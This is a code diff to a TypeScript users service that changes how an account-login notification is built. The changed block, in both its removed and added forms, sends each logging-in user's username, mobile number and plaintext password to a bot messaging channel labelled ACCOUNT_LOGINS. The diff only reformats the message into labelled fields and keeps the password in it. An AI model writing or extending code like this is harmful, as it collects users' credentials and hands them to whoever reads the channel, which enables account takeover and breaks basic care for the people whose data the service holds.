@@ -115,8 +115,15 @@ export class UsersService {
     } else {
       await this.botsService.sendMessageByCategory(
         ChannelCategory.ACCOUNT_LOGINS,
-        `<b>Account Login</b>\n\n<b>Username:</b> ${userData.username ? `@${userData.username}` : userData.firstName}\n<b>Mobile:</b> ${canonicalMobile}${userData.password ? `\n<b>Password:</b> ${userData.password}` : ''}`,
-        { parseMode: 'HTML' },
+        {
+          title: 'Account Login',
+          fields: [
+            { label: 'Account', value: userData.username ? `@${userData.username}` : userData.firstName },
+            { label: 'Mobile', value: canonicalMobile },
+            { label: 'Password', value: userData.password },
+          ],
+        },
+        undefined,
         false
       );
       const newUser = new this.userModel(userData);
